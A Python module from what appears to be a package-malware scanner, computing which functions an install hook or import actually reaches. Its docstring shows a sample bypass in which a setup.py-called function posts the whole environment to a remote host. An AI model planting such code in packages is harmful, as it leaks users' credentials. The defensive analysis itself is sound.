"""Which function bodies an install hook actually causes to run.

`ImportClosure` answers which files run at install time, and answering it made
the context correct for the relocation bypass it was written against. It also
made the context correct for far too much: `setup.py` in a source distribution
ordinarily does `import mypackage` to read `__version__`, and from there the
closure reaches the whole library.

`pytorch/pytorch` is the case that forced this module. Its `setup.py` is a real
packaging script at the distribution root, so every guard on what counts as a
hook passes it, and `torch/hub.py` is reachable by import from it. Inside
`_validate_not_a_forked_repo` the module reads `GITHUB_TOKEN` from the
environment and sends it to `api.github.com` in an `Authorization` header --
which is what a GitHub token is for. That was `MALWARE.EXFIL.001`, CRITICAL,
in the MALICIOUS category, on one of the most installed Python libraries there
is, telling the reader to treat their host as compromised and rotate every
credential on it.

Importing `torch.hub` DEFINES that function. It does not call it. The claim the
rule makes -- "executes automatically on every install" -- is false for it, and
it is false for the great majority of a library's code.

## Why not "module level only"

The obvious rule is that only a module's top-level statements run on import, so
only those should carry the context. That is true, and using it would reopen the
exact bypass `ImportClosure` exists to close:

    # setup.py
    import _bootstrap; _bootstrap.init()

    # _bootstrap.py
    def init():
        urlopen("https://" + host, data=str(dict(os.environ)).encode())

Every capability there is inside a `def`, and the `def` is called. The
difference between that function and `torch.hub`'s is not where it is written;
it is whether anything on the install path calls it.

## What this does instead

A conservative call graph. The roots are the statements that run on import --
module level, and class bodies, which execute when the class is defined. From
there it follows calls by NAME to first-party function definitions and repeats
to a fixed point. What is left over -- a function nothing on that path calls --
is deferred, and its line range is reported to the caller.

Every approximation is made in the direction of keeping the finding, because
this decides the most serious claim the tool makes:

* A name is matched against every definition that bears it, in any file in the
  closure. Two unrelated `init` functions are both reachable if either is
  called.
* A decorated function is always reachable. A decorator can register it to be
  called from somewhere this analysis cannot see, which is how a plugin, a CLI
  and a task queue all work.
* A dunder is always reachable. `__init__` runs on construction and nothing
  calls it by name.
* A file that will not parse defers nothing, so all of it keeps the context.

So a function is called deferred only when it is written in ordinary Python,
has no decorator, is not a dunder, and no call to its name appears anywhere the
install path reaches.
"""

from __future__ import annotations

import ast
from typing import TYPE_CHECKING, Final

from cordon_scanner.analysis.python.pysyntax import PythonSyntax

if TYPE_CHECKING:
    from collections.abc import Iterable, Mapping

MAX_FUNCTIONS = 50_000
"""Ceiling on definitions indexed, for the same reason `ImportClosure` has one.

The graph is attacker-supplied. Beyond this the analysis stops and defers
nothing, which keeps the context rather than dropping it -- the safe direction,
and the reason the number has to be generous rather than cautious. Set to 5,000
first, which is the shape of mistake this ceiling invites: a 500-file slice of a
library the size of `torch` carries three times that, so the analysis would have
declined to run on exactly the repositories it was written for, and declined
silently. Measured at 15,000 definitions across 500 files it takes 0.6s, so the
cost was never what the low number implied.

`ImportClosure.MAX_FILES` already bounds the input to 500 files, so this bounds
only the pathological case of a file that is nothing but definitions."""

SETUPTOOLS_COMMANDS = frozenset(
    {
        "install",
        "install_lib",
        "install_scripts",
        "install_data",
        "build",
        "build_py",
        "build_ext",
        "build_clib",
        "bdist_wheel",
        "bdist_egg",
        "develop",
        "egg_info",
        "sdist",
    }
)
"""The setuptools commands an install or a build runs. `test`, `upload`, `clean` and the bare
`Command` base are commands somebody runs by name; pycryptodome's self-test command imports its
test modules by computed name, and nothing a consumer does runs it. `_install` is the usual
import alias, so a leading underscore is ignored when a base is matched."""


class CallReachability:
    """The function bodies an install hook never reaches."""

    @staticmethod
    def _functions(tree: ast.Module) -> list[ast.FunctionDef | ast.AsyncFunctionDef]:
        return [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.FunctionDef | ast.AsyncFunctionDef)
        ]

    @staticmethod
    def _called_names(nodes: Iterable[ast.AST]) -> set[str]:
        """Every name that appears as the callee of a call in these nodes.

        `f()` contributes `f` and `a.b.f()` contributes `f`: the attribute path
        is not resolved, because resolving it needs the import graph and getting
        it wrong drops a finding. The last segment alone over-approximates,
        which is the safe direction.
        """
        names: set[str] = set()
        for node in nodes:
            for inner in ast.walk(node):
                if not isinstance(inner, ast.Call):
                    continue
                func = inner.func
                if isinstance(func, ast.Name):
                    names.add(func.id)
                elif isinstance(func, ast.Attribute):
                    names.add(func.attr)
                # A function handed to a call is called by it: `self.execute(_post_install,
                # ...)` in a setuptools command, `atexit.register(f)`, `Thread(target=f)`.
                for argument in [*inner.args, *(k.value for k in inner.keywords)]:
                    if isinstance(argument, ast.Name):
                        names.add(argument.id)
                    elif isinstance(argument, ast.Attribute):
                        names.add(argument.attr)
        return names

    @staticmethod
    def _by_hand_command_methods(
        tree: ast.Module,
    ) -> list[ast.FunctionDef | ast.AsyncFunctionDef]:
        """Methods of classes registered in `cmdclass` only under keys no install runs."""
        install_time: set[str] = set()
        by_hand: set[str] = set()
        for node in ast.walk(tree):
            mapping = (
                node.value
                if isinstance(node, ast.keyword) and node.arg == "cmdclass"
                else node.value
                if isinstance(node, ast.Assign)
                and any(isinstance(t, ast.Name) and t.id == "cmdclass" for t in node.targets)
                else None
            )
            if not isinstance(mapping, ast.Dict):
                continue
            for key, value in zip(mapping.keys, mapping.values, strict=True):
                if not isinstance(value, ast.Name) or not isinstance(key, ast.Constant):
                    continue
                (install_time if key.value in SETUPTOOLS_COMMANDS else by_hand).add(value.id)
        names = by_hand - install_time
        return [
            child
            for node in ast.walk(tree)
            if isinstance(node, ast.ClassDef) and node.name in names
            for child in node.body
            if isinstance(child, ast.FunctionDef | ast.AsyncFunctionDef)
        ]

    @staticmethod
    def _command_methods(tree: ast.Module) -> list[ast.FunctionDef | ast.AsyncFunctionDef]:
        """Methods of the classes setuptools runs as commands in this module."""
        registered: set[str] = set()
        for node in ast.walk(tree):
            mapping = (
                node.value
                if isinstance(node, ast.keyword) and node.arg == "cmdclass"
                else node.value
                if isinstance(node, ast.Assign)
                and any(isinstance(t, ast.Name) and t.id == "cmdclass" for t in node.targets)
                else None
            )
            if isinstance(mapping, ast.Dict):
                registered |= {
                    value.id
                    for key, value in zip(mapping.keys, mapping.values, strict=True)
                    if isinstance(value, ast.Name)
                    and isinstance(key, ast.Constant)
                    and key.value in SETUPTOOLS_COMMANDS
                }
        methods: list[ast.FunctionDef | ast.AsyncFunctionDef] = []
        for node in ast.walk(tree):
            if not isinstance(node, ast.ClassDef):
                continue
            bases = {
                (
                    base.attr
                    if isinstance(base, ast.Attribute)
                    else base.id
                    if isinstance(base, ast.Name)
                    else ""
                ).lstrip("_")
                for base in node.bases
            }
            if node.name in registered or bases & SETUPTOOLS_COMMANDS:
                methods.extend(
                    child
                    for child in node.body
                    if isinstance(child, ast.FunctionDef | ast.AsyncFunctionDef)
                )
        return methods

    @classmethod
    def _always_reachable(cls, node: ast.FunctionDef | ast.AsyncFunctionDef) -> bool:
        if node.decorator_list:
            return True
        return node.name.startswith("__") and node.name.endswith("__")

    @classmethod
    def _roots(cls, tree: ast.Module, *, run_as_main: bool = True) -> list[ast.AST]:
        """The statements that run when this module is imported.

        Module level, plus class bodies: a `class` statement executes its body
        at definition time, so a call written there runs on import. An
        `if __name__ == "__main__":` block runs only when the file is executed
        directly -- `setup.py` is, a module `setup.py` imports for its version
        is not, and nodeenv's whole command line sits behind that guard.
        """
        argv_names = cls._argv_names(tree)
        roots: list[ast.AST] = []
        pending: list[ast.stmt] = list(tree.body)
        while pending:
            node = pending.pop(0)
            if isinstance(node, ast.FunctionDef | ast.AsyncFunctionDef):
                continue
            if not run_as_main and cls.is_main_guard(node):
                continue
            if isinstance(node, ast.If) and cls._is_by_hand_command(node.test, argv_names):
                # `if sys.argv[-1] == "publish":` / `elif command == "coverage":` -- branches a
                # maintainer reaches by typing `setup.py publish`; pip invokes `setup.py` with
                # `egg_info`, `bdist_wheel` and the rest of the install commands, never these.
                # The `else` side still runs.
                pending[:0] = node.orelse
                continue
            roots.append(node)
        return roots

    @staticmethod
    def _argv_names(tree: ast.Module) -> set[str]:
        """Module-level names bound to an element of `sys.argv`."""
        names: set[str] = set()
        for node in tree.body:
            if (
                isinstance(node, ast.Assign)
                and isinstance(node.value, ast.Subscript)
                and ast.unparse(node.value.value) == "sys.argv"
            ):
                names.update(t.id for t in node.targets if isinstance(t, ast.Name))
        return names

    @staticmethod
    def _is_by_hand_command(test: ast.AST, argv_names: set[str]) -> bool:
        """`<argv element> == "<command>"` for a command no install runs."""
        if not (
            isinstance(test, ast.Compare) and len(test.ops) == 1 and isinstance(test.ops[0], ast.Eq)
        ):
            return False
        sides = [test.left, test.comparators[0]]
        literal = next(
            (s.value for s in sides if isinstance(s, ast.Constant) and isinstance(s.value, str)),
            None,
        )
        argv = any(
            (isinstance(s, ast.Name) and s.id in argv_names)
            or (isinstance(s, ast.Subscript) and ast.unparse(s.value) == "sys.argv")
            for s in sides
        )
        return argv and literal is not None and literal not in SETUPTOOLS_COMMANDS

    @staticmethod
    def is_main_guard(node: ast.AST) -> bool:
        if not isinstance(node, ast.If) or not isinstance(node.test, ast.Compare):
            return False
        sides = [node.test.left, *node.test.comparators]
        names = {side.id for side in sides if isinstance(side, ast.Name)}
        values = {side.value for side in sides if isinstance(side, ast.Constant)}
        return names == {"__name__"} and values == {"__main__"}

    @classmethod
    def deferred_lines(
        cls,
        hooks: Iterable[str],
        sources: Mapping[str, str],
        entries: Iterable[str] | None = None,
    ) -> frozenset[tuple[str, int, int]]:
        """`(path, first_line, last_line)` for each body the hooks never reach.

        `hooks` is the install closure -- the hook files and everything they
        import. `sources` is the repository's Python by path.
        """
        trees: dict[str, ast.Module] = {}
        for path in hooks:
            source = sources.get(path)
            if source is None:
                continue
            try:
                trees[path] = PythonSyntax.parse(source)
            except (SyntaxError, ValueError, RecursionError):
                # Unparseable: defer nothing, so every capability in it keeps
                # the context it has today.
                # S2: an excuse; failing excuses nothing, so the finding it would lower stands
                continue

        # Methods of a command class registered only under a command somebody runs by name
        # (`cmdclass={"test": TestCommand}`). setuptools calls them for `setup.py test` and for
        # nothing else, so a `subprocess.run(...)` elsewhere must not make `TestCommand.run`
        # reachable through the shared method name.
        by_hand: set[int] = set()
        for tree in trees.values():
            by_hand |= {id(method) for method in cls._by_hand_command_methods(tree)}

        by_name: dict[str, list[tuple[str, ast.FunctionDef | ast.AsyncFunctionDef]]] = {}
        total = 0
        for path, tree in trees.items():
            for node in cls._functions(tree):
                total += 1
                if id(node) in by_hand:
                    continue
                by_name.setdefault(node.name, []).append((path, node))
        if total > MAX_FUNCTIONS:
            return frozenset()

        # Seed: everything that runs on import, plus the definitions this
        # analysis refuses to reason about at all.
        reachable: set[int] = set()
        frontier: list[ast.AST] = []
        executed = None if entries is None else set(entries)
        for path, tree in trees.items():
            frontier.extend(cls._roots(tree, run_as_main=executed is None or path in executed))
        for definitions in by_name.values():
            for _path, node in definitions:
                if cls._always_reachable(node):
                    reachable.add(id(node))
                    frontier.extend(node.body)
        # A setuptools command class is called by pip, not by this file: `cmdclass={"install":
        # install}` and `class install(_install): def run(self): ...` run `run` at install
        # whatever else the module does.
        for tree in trees.values():
            for method in cls._command_methods(tree):
                if id(method) not in reachable:
                    reachable.add(id(method))
                    frontier.extend(method.body)

        # Fixed point over called names.
        seen_names: set[str] = set()

        while frontier:
            names = cls._called_names(frontier) - seen_names
            seen_names |= names
            frontier = []
            for name in names:
                for _path, node in by_name.get(name, ()):
                    if id(node) in reachable:
                        continue
                    reachable.add(id(node))
                    frontier.extend(node.body)

        deferred: set[tuple[str, int, int]] = set()
        for path, tree in trees.items():
            for node in cls._functions(tree):
                if id(node) in reachable or not node.body:
                    continue
                first = node.body[0].lineno
                last = node.end_lineno or node.body[-1].lineno
                deferred.add((path, first, last))
        return frozenset(deferred)


#: The import-time reach (approach 1, reviews/pypi-98/10): what runs when a consumer imports a module of
#: a published distribution. Unlike `CallReachability` above (the install path, conservative for a small
#: `setup.py` closure), names are resolved as Python binds them, per module: a decorated function and a
#: dunder are not reached for being one, and `obj.f()` on an object is not the module's `f`. Measured:
#: CallReachability's reach over a whole library blocked 47 of 1,145 benign; this one, line-precise, 7.

RUNNERS: Final = frozenset(
    {
        "register",
        "Thread",
        "Timer",
        "signal",
        "start_new_thread",
        "Process",
        "submit",
        "call_soon",
        "run_in_executor",
    }
)
DEFINITION_DUNDERS: Final = frozenset({"__init_subclass__", "__set_name__", "__class_getitem__"})
CONSTRUCT: Final = ("__init__", "__new__", "__post_init__")
SOURCE_ROOTS: Final = ("src", "lib", "python")


class LoadModule:
    """One parsed module: its dotted name, what it defines, and what its imports bind."""

    def __init__(self, path: str, dotted: str, tree: ast.Module, is_package: bool) -> None:
        self.path, self.dotted, self.tree, self.is_package = path, dotted, tree, is_package
        self.functions: dict[str, ast.AST] = {}
        self.classes: dict[str, ast.ClassDef] = {}
        self.methods: dict[str, list[ast.AST]] = {}
        for statement in tree.body:
            if isinstance(statement, (ast.FunctionDef, ast.AsyncFunctionDef)):
                self.functions[statement.name] = statement
            elif isinstance(statement, ast.ClassDef):
                self.classes[statement.name] = statement
        for node in ast.walk(tree):
            if isinstance(node, ast.ClassDef):
                for item in node.body:
                    if isinstance(item, (ast.FunctionDef, ast.AsyncFunctionDef)):
                        self.methods.setdefault(item.name, []).append(item)
        # name -> ("module", dotted) or ("symbol", dotted, name)
        self.bindings: dict[str, tuple[str, ...]] = {}
        package = dotted if is_package else dotted.rpartition(".")[0]
        for found in ast.walk(tree):
            node = found
            if isinstance(node, ast.Import):
                for a in node.names:
                    if a.asname:
                        self.bindings[a.asname] = ("module", a.name)
                    else:
                        top = a.name.split(".")[0]
                        self.bindings[top] = ("module", top)
            elif isinstance(node, ast.ImportFrom):
                if node.level:
                    parts = package.split(".") if package else []
                    base_parts = parts[: len(parts) - (node.level - 1)] if node.level > 1 else parts
                    base = ".".join(p for p in [*base_parts, node.module or ""] if p)
                else:
                    base = node.module or ""
                for a in node.names:
                    if a.name == "*":
                        self.bindings.setdefault("*" + base, ("star", base))
                        continue
                    self.bindings[a.asname or a.name] = ("from", base, a.name)


class LoadReach:
    """What importing a published package runs, resolved per module (`deferred_lines`)."""

    def __init__(self, paths: Iterable[str], sources: Mapping[str, str]) -> None:
        self.modules: dict[str, LoadModule] = {}
        self.by_path: dict[str, LoadModule] = {}
        for path in sorted(paths):
            src = sources.get(path)
            if src is None:
                continue
            try:
                tree = PythonSyntax.parse(src)
            except (SyntaxError, ValueError):
                # S2: covered by SOURCE.UNPARSED at every running file (install closure, import entries, command modules); proven by test_not_python3.py TestPackageSourceThatDoesNotParse
                continue  # unparsed: defers nothing, every line keeps its context
            dotted, is_package = LoadReach.dotted(path)
            module = LoadModule(path, dotted, tree, is_package)
            self.modules.setdefault(dotted, module)
            self.by_path[path] = module
        self.reached: set[int] = set()
        self.frontier: list[tuple[LoadModule, ast.AST]] = []

    @staticmethod
    def dotted(path: str) -> tuple[str, bool]:
        """`pkg-1.0/src/pkg/sub/mod.py` -> (`pkg.sub.mod`, False); `.../pkg/__init__.py` -> (`pkg`, True)."""
        parts = path.rpartition("!")[2].split("/")
        parts = parts[1:] if len(parts) > 1 else parts  # the archive's top directory
        while parts and parts[0] in SOURCE_ROOTS:
            parts = parts[1:]
        name = (
            parts[-1][:-3] if parts and parts[-1].endswith(".py") else (parts[-1] if parts else "")
        )
        is_package = name == "__init__"
        dotted = ".".join([*parts[:-1]] + ([] if is_package else [name]))
        return dotted, is_package

    @staticmethod
    def _is_main_guard(node: ast.stmt) -> bool:
        if not isinstance(node, ast.If):
            return False
        t = node.test
        return (
            isinstance(t, ast.Compare)
            and isinstance(t.left, ast.Name)
            and t.left.id == "__name__"
            and any(isinstance(c, ast.Constant) and c.value == "__main__" for c in t.comparators)
        )

    @classmethod
    def _load_statements(cls, body: Iterable[ast.stmt]) -> list[ast.AST]:
        """What runs when a body runs at load: not function bodies; class bodies, decorators,
        defaults and bases, which run at definition; never `if __name__ == "__main__":`."""
        out: list[ast.AST] = []
        for stmt in body:
            if cls._is_main_guard(stmt):
                continue
            if isinstance(stmt, (ast.FunctionDef, ast.AsyncFunctionDef)):
                out.extend(stmt.decorator_list)
                out.extend(d for d in stmt.args.defaults + stmt.args.kw_defaults if d is not None)
                continue
            if isinstance(stmt, ast.ClassDef):
                out.extend(stmt.decorator_list)
                out.extend(stmt.bases)
                out.extend(k.value for k in stmt.keywords)
                out.extend(cls._load_statements(stmt.body))
                continue
            out.append(stmt)
        return out

    def _symbol(
        self, module: LoadModule, name: str, depth: int = 0
    ) -> list[tuple[LoadModule, ast.AST]]:
        """What `name` names in `module`: a first-party function or class, followed through imports."""
        if depth > 8:
            return []
        if name in module.functions:
            return [(module, module.functions[name])]
        if name in module.classes:
            return [(module, module.classes[name])]
        bound = module.bindings.get(name)
        if bound and bound[0] == "from":
            target = self.modules.get(bound[1])
            if target is not None:
                return self._symbol(target, bound[2], depth + 1)
        for key, star in module.bindings.items():
            if key.startswith("*"):
                target = self.modules.get(star[1])
                if target is not None and (name in target.functions or name in target.classes):
                    return self._symbol(target, name, depth + 1)
        return []

    def _bound_module(self, module: LoadModule, name: str) -> LoadModule | None:
        """The first-party module an import bound to `name`, if any."""
        bound = module.bindings.get(name)
        if not bound:
            return None
        if bound[0] == "module":
            return self.modules.get(bound[1])
        if bound[0] == "from":
            return self.modules.get(f"{bound[1]}.{bound[2]}" if bound[1] else bound[2])
        return None

    @staticmethod
    def _methods(owner: LoadModule, klass: ast.AST, name: str) -> list[tuple[LoadModule, ast.AST]]:
        if not isinstance(klass, ast.ClassDef):
            return []
        return [
            (owner, m)
            for m in klass.body
            if isinstance(m, (ast.FunctionDef, ast.AsyncFunctionDef)) and m.name == name
        ]

    def _edges(self, module: LoadModule, call: ast.Call) -> list[tuple[LoadModule, ast.AST]]:
        """Where a call goes in first-party code, as Python binds the names it uses."""
        func = call.func
        if isinstance(func, ast.Name):
            return self._symbol(module, func.id)
        if not isinstance(func, ast.Attribute):
            return []
        base = func.value
        if isinstance(base, ast.Name):
            if base.id in ("self", "cls"):
                return [(module, m) for m in module.methods.get(func.attr, ())]
            target = self._bound_module(module, base.id)
            if target is not None:
                return self._symbol(target, func.attr)
            found = self._symbol(module, base.id)  # Klass.f(...)
            return self._methods(found[0][0], found[0][1], func.attr) if found else []
        if isinstance(base, ast.Call):  # Klass().f() or super().f()
            if isinstance(base.func, ast.Name) and base.func.id == "super":
                return [(module, m) for m in module.methods.get(func.attr, ())]
            out: list[tuple[LoadModule, ast.AST]] = []
            for owner, klass in self._edges(module, base):
                out += self._methods(owner, klass, func.attr)
            return out
        return []

    def _runner_args(self, module: LoadModule, call: ast.Call) -> list[tuple[LoadModule, ast.AST]]:
        """A function handed to a runner at load (`atexit.register(f)`, `Thread(target=f)`): it runs
        without anybody asking."""
        func = call.func
        callee = func.attr if isinstance(func, ast.Attribute) else getattr(func, "id", None)
        if callee not in RUNNERS:
            return []
        out: list[tuple[LoadModule, ast.AST]] = []
        for arg in [*call.args, *(k.value for k in call.keywords)]:
            if isinstance(arg, ast.Name):
                out += self._symbol(module, arg.id)
            elif isinstance(arg, ast.Attribute) and isinstance(arg.value, ast.Name):
                if arg.value.id in ("self", "cls"):
                    out += [(module, m) for m in module.methods.get(arg.attr, ())]
                elif (target := self._bound_module(module, arg.value.id)) is not None:
                    out += self._symbol(target, arg.attr)
        return out

    def _visit(self, module: LoadModule, node: ast.AST) -> None:
        """Mark a function reached, or a class's constructor when the class is built."""
        if isinstance(node, ast.ClassDef):
            for item in node.body:
                if (
                    isinstance(item, (ast.FunctionDef, ast.AsyncFunctionDef))
                    and item.name in CONSTRUCT
                    and id(item) not in self.reached
                ):
                    self.reached.add(id(item))
                    self.frontier.append((module, item))
            return
        if id(node) not in self.reached:
            self.reached.add(id(node))
            self.frontier.append((module, node))

    @staticmethod
    def _calls_in(nodes: Iterable[ast.AST]) -> Iterable[ast.AST]:
        """Every node a body runs, not those of nested definitions."""
        for root in nodes:
            stack = [root]
            while stack:
                node = stack.pop()
                nested = (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda, ast.ClassDef)
                if node is not root and isinstance(node, nested):
                    continue
                yield node
                stack.extend(ast.iter_child_nodes(node))

    @classmethod
    def _local_functions(cls, nodes: list[ast.AST]) -> dict[str, ast.AST]:
        """The functions a body defines for itself (`def _r(): ...` inside `_s`), by name."""
        local: dict[str, ast.AST] = {}
        for root in nodes:
            stack = [root]
            while stack:
                node = stack.pop()
                if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                    local.setdefault(node.name, node)
                    continue
                if isinstance(node, (ast.Lambda, ast.ClassDef)):
                    continue
                stack.extend(ast.iter_child_nodes(node))
        return local

    def _local_targets(self, local: dict[str, ast.AST], call: ast.Call) -> list[ast.AST]:
        """A call to, or a runner handed, one of the body's own functions."""
        out: list[ast.AST] = []
        if isinstance(call.func, ast.Name) and call.func.id in local:
            out.append(local[call.func.id])
        callee = (
            call.func.attr
            if isinstance(call.func, ast.Attribute)
            else getattr(call.func, "id", None)
        )
        if callee in RUNNERS:
            out += [
                local[a.id]
                for a in [*call.args, *(k.value for k in call.keywords)]
                if isinstance(a, ast.Name) and a.id in local
            ]
        return out

    def _follow(self, module: LoadModule, nodes: list[ast.AST]) -> None:
        local = self._local_functions(nodes)
        for node in self._calls_in(nodes):
            if isinstance(node, ast.Call):
                for owner, target in [*self._edges(module, node), *self._runner_args(module, node)]:
                    self._visit(owner, target)
                for target in self._local_targets(local, node):
                    self._visit(module, target)
            elif (
                isinstance(node, ast.Assign)
                and any(getattr(t, "attr", None) == "excepthook" for t in node.targets)
                and isinstance(node.value, ast.Name)
            ):
                for owner, target in self._symbol(module, node.value.id):
                    self._visit(owner, target)

    def _run(self) -> None:
        pending: list[tuple[LoadModule, list[ast.AST]]] = []
        for module in self.by_path.values():
            pending.append((module, self._load_statements(module.tree.body)))
            for node in ast.walk(module.tree):
                if not isinstance(node, ast.ClassDef):
                    continue
                for item in node.body:
                    if (
                        isinstance(item, (ast.FunctionDef, ast.AsyncFunctionDef))
                        and item.name in DEFINITION_DUNDERS
                    ):
                        self.reached.add(id(item))
                        pending.append((module, list(item.body)))
        while pending or self.frontier:
            while self.frontier:
                module, fn = self.frontier.pop()
                pending.append((module, list(getattr(fn, "body", []))))
            module, nodes = pending.pop()
            self._follow(module, nodes)

    @staticmethod
    def deferred_lines(
        paths: Iterable[str], sources: Mapping[str, str]
    ) -> frozenset[tuple[str, int, int]]:
        """`(path, first_line, last_line)` for each function body importing these modules never runs."""
        reach = LoadReach(paths, sources)
        reach._run()
        deferred: set[tuple[str, int, int]] = set()
        for path, module in reach.by_path.items():
            for node in ast.walk(module.tree):
                if (
                    isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
                    and id(node) not in reach.reached
                    and node.body
                ):
                    last = node.end_lineno or node.body[-1].lineno
                    deferred.add((path, node.body[0].lineno, last))
            # A module's `if __name__ == "__main__":` block runs when it is a script, never when it
            # is imported.
            for statement in module.tree.body:
                if (
                    isinstance(statement, ast.If)
                    and LoadReach._is_main_guard(statement)
                    and statement.body
                ):
                    last = statement.end_lineno or statement.body[-1].lineno
                    deferred.add((path, statement.body[0].lineno, last))
        return frozenset(deferred)


__all__ = ["CallReachability", "LoadModule", "LoadReach"]
